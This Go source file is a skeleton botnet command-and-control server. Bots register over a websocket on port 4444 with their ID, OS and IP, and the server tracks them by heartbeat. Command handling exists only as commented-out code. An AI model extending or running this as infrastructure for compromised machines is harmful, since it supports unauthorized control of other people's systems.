package main

import (
	"context"
	"fmt"
	"log"
	"net/http"
	"sync"
	"time"

	"github.com/coder/websocket"
	"github.com/coder/websocket/wsjson"
)

type Bot struct {
	mu sync.RWMutex

	ID       string `json:"id"`
	OS       string `json:"os"`
	IP       string `json:"ip"`
	LastSeen time.Time
	Active   bool
	// Command Command
}

// type Command struct {
// 	Cmdname string
// 	Result  string
// }

type c2 struct {
	bots map[string]*Bot
}

func Newc2() *c2 {
	return &c2{
		bots: make(map[string]*Bot),
	}
}

func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
	b := Bot{
		Active: false,
	}

	var con *websocket.Conn
	var err error
	if con, err = websocket.Accept(w, r, nil); err != nil {
		log.Println(err)
		return
	}
	go heartBeat(con, &b)
	defer con.Close(websocket.StatusNormalClosure, "")
	ctx := context.Background()
	if err := wsjson.Read(ctx, con, &b); err != nil {
		log.Println(err)
		return
	}
	b.mu.Lock()
	b.LastSeen = time.Now()
	b.Active = true
	c.bots[b.ID] = &b
	b.mu.Unlock()
	fmt.Print(b.ID, b.IP, b.OS, b.LastSeen)
	for {
		var botmsg string
		if err := wsjson.Read(ctx, con, &botmsg); err != nil {
			log.Println(err)
			return
		}

		switch botmsg {
		case "heartbeat":
			b.mu.Lock()
			b.LastSeen = time.Now()
			b.mu.Unlock()
		}

	}

}

func heartBeat(con *websocket.Conn, bot *Bot) {

	timer := time.Tick(10 * time.Second)
	inactiveSince := time.Now()

	for range timer {
		bot.mu.Lock()
		lastseen := bot.LastSeen
		active := bot.Active
		bot.mu.Unlock()
		if !active {
			if time.Since(inactiveSince) > 15*time.Second {
				fmt.Println("Closing now...")
				con.CloseNow()
				return
			}
			continue
		}

		if time.Since(lastseen) > 1*time.Minute {
			fmt.Println("Closing now..")
			con.CloseNow()
			return
		}

	}

}
func main() {
	c2 := Newc2()
	http.HandleFunc("/connect", c2.connectBot)
	http.ListenAndServe(":4444", nil)

}
